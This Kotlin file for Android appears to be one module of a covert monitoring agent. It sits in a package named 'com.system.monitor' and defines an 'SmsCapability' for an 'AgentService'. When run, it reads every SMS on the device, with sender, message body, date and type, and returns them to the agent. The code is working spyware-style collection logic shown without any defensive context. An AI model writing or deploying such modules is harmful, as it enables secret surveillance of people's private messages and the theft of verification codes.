package com.system.monitor.capabilities

import android.content.ContentResolver
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import com.google.gson.Gson
import com.system.monitor.AgentService

class SmsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val resolver: ContentResolver = service.contentResolver
        val cursor = resolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            null, null, Telephony.Sms.DATE + " DESC"
        ) ?: return mapOf("error" to "no sms")

        val messages = mutableListOf<Map<String, Any>>()
        while (cursor.moveToNext()) {
            messages.add(mapOf(
                "id" to cursor.getLong(0),
                "address" to cursor.getString(1),
                "body" to cursor.getString(2),
                "date" to cursor.getLong(3),
                "type" to cursor.getInt(4)
            ))
        }
        cursor.close()
        return mapOf("messages" to messages)
    }

    override fun cleanup() {}
}